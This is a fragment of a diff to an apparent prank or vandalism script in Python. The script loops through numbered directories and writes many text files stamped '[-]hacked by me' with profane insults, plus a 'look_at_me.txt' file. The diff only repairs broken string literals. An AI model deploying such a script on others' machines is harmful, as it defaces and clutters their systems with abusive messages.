@@ -33,9 +33,7 @@ for i in range(1000):
         os.chdir(c)
         f = open(c+".txt", "w+")
         for g in range(10):
-            f.write("[-]hacked by me "+'
-'+"
- YOUR FAMILY FUCKED")
+            f.write("[-]hacked by me "+"YOUR FAMILY FUCKED")
 
         if c == '999':
           break
@@ -115,9 +113,7 @@ for i in range(1000):
         f = open(c+".txt", "w+")
 
         for g in range(10):
-            f.write("[-]hacked by me "+'
-'+"
- FUCK YOU")
+            f.write("[-]hacked by me FUCK YOU")
 
             g = open("look_at_me.txt","w+")
             for i in range(1):
